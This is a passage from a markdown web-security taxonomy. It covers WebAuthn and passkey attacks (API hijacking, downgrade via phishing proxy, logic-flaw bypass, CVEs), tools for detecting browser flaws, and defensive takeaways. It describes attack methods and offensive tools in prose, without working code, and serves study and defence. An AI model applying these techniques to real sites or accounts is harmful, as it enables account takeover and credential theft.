| **WebAuthn API Hijacking** | Attacker hijacks WebAuthn API via XSS or malicious extension, forging registration and login (DEF CON 2025 SquareX research) | JavaScript injection overwrites navigator.credentials.create() and .get() methods |
| **Synced Passkey Downgrade** | Phishing proxy spoofs unsupported browser; Entra/IdP disables passkeys; user falls back to SMS/OTP (Proofpoint 2025) | Attacker spoofs old browser UA; victim offered weaker auth; proxy captures credentials and session cookie |
| **WebAuthn Logic Flaw Bypass** | Application trusts frontend challenge without backend verification | Attacker starts WebAuthn flow with victim's username, signs challenge with own passkey, gains access to victim account |
| **StrongKey FIDO Server Logic Flaw (CVE-2025-26788)** | NVD describes this as non-discoverable credential flow being treated as discoverable transactions. The security implications beyond the official description remain interpretive — characterizing this as a "passkey bypass" goes beyond the official advisory | StrongKey FIDO Server 4.10.0–4.15.0; non-discoverable credential flow mishandled |
| **Chrome Android WebAuthn Privilege Escalation (CVE-2024-9956)** | Inappropriate implementation in WebAuthentication in Chrome on Android allowed a local attacker to perform privilege escalation via a crafted HTML page (NVD). Specific bypass mechanism not publicly detailed beyond Chromium advisory | Chrome on Android prior to 130.0.6723.58; requires local attacker |
| **Phishing via Synchronized Passkey Fabric** | Attacker phishes credentials to synchronization service (Google Password Manager, iCloud Keychain); gains access to all passkeys | If attacker compromises iCloud/Google account, all synchronized passkeys accessible |

These vulnerabilities demonstrate the "WebAuthn Loop" phenomenon: technically phishing-resistant protocols undermined by implementation flaws. WebAuthn API hijacking requires XSS or malicious extensions but completely defeats passkey security. Downgrade attacks exploit IdP logic allowing fallback to weaker methods.

## Related Dedicated Taxonomies

| Topic | Document |
|---|---|
| Cookies and SameSite | [cookie.md](cookie.md) |
| Frame isolation and clickjacking | [ui-redressing.md](ui-redressing.md) |
| DOM named access | [dom-clobbering.md](dom-clobbering.md) |
| Sanitizer/parser mutation | [mutation-xss.md](mutation-xss.md) |
| Persistent browser interception | [service-worker.md](service-worker.md) |
| Extension privilege boundaries | [browser-extension-security.md](browser-extension-security.md) |
| WebSocket origin validation | [websocket.md](../03-http-protocol/websocket.md) |
| URL normalization | [url-confusion.md](../06-encoding-parser/url-confusion.md) |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **DOM Invader** (Offensive) | Browser-based DOM XSS testing | Tests web messages, prototype pollution, DOM clobbering, XSS sinks. Integrated with Burp |
| **CSP Evaluator** (Defensive) | CSP policy analysis | Identifies unsafe directives, JSONP endpoints on whitelisted domains, policy bypasses |
| **JSONPeek + CSP B Gone** (Offensive) | JSONP endpoint discovery for CSP bypass | Scans for JSONP endpoints on whitelisted domains; automates CSP bypass via JSONP |
| **Browser Fuzzing Tools** (Research) | JavaScript engine, HTML parser, API fuzzing | JIT-Picker (JS engine), WebGlitch (WebGPU), domato (DOM fuzzing) |
| **Can I Use / MDN Browser Compat Data** (Defensive) | Browser feature compatibility tracking | Identifies which security features supported across browsers |
| **Chrome DevTools Security Panel** (Defensive) | Browser-native security auditing | Identifies mixed content, insecure origins, certificate issues |
| **Mozilla Observatory** (Defensive) | Website security analysis | Tests CSP, cookies, HSTS, subresource integrity, referrer policy |
| **DiffCSP** (Research) | CSP enforcement differential testing | Generates adversarial HTML/CSP combinations and executes them across desktop and mobile browsers. Decision-tree analysis compressed large execution results into analyzable paths and found security bugs in Chrome/Firefox/Safari. NDSS 2023 |

---

## Defensive Takeaways

- Treat `origin`, `site`, browsing context, and network endpoint as distinct security boundaries.
- Validate cross-origin messages and requests at the receiver; browser attachment of credentials is not authorization.
- Use CSP, Trusted Types, cookie attributes, frame restrictions, and cross-origin isolation as independent layers.
- Test URL, HTML, and policy handling across every parser that processes attacker-controlled input.
- Prefer strict defaults and explicit allowlists, while accounting for legacy-browser behavior.

---


---

## References

1. [Same-origin policy | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
2. [Content Security Policy Level 3 | W3C](https://www.w3.org/TR/CSP3/)
3. [CORS misconfiguration | PortSwigger Web Security Academy](https://portswigger.net/web-security/cors)
4. [CVE-2024-49038: postMessage trust-boundary failure | Microsoft MSRC](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)
5. [Strict-Transport-Security | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
6. [Cross-origin isolation | web.dev](https://web.dev/articles/why-coop-coep)
7. [SLAP and FLOP: Safari site-isolation analysis | Open Web Advocacy](https://open-web-advocacy.org/blog/slap-and-flop--apples-lack-of-full-site-isolation-and-ios-browser-ban-puts-users-at-risk/)
8. [URL Standard | WHATWG](https://url.spec.whatwg.org/)
9. [Security implications of URL parsing differentials | Sonar](https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/)
10. [Dangling markup injection | PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
11. [Fetch Metadata Request Headers | W3C](https://www.w3.org/TR/fetch-metadata/)
12. [Web Authentication Level 3 | W3C](https://www.w3.org/TR/webauthn-3/)
13. [Passkeys Pwned: WebAuthn API hijacking | SquareX Labs](https://labs.sqrx.com/passkeys-pwned-turning-webauth-against-itself-0dbddb7ade1a)
14. [Same Origin Method Execution | Ben Hayak](https://www.benhayak.com/2015/06/same-origin-method-execution-some.html)
15. [DiffCSP: Differential Testing of CSP Enforcement | NDSS 2023](https://github.com/WSP-LAB/DiffCSP)
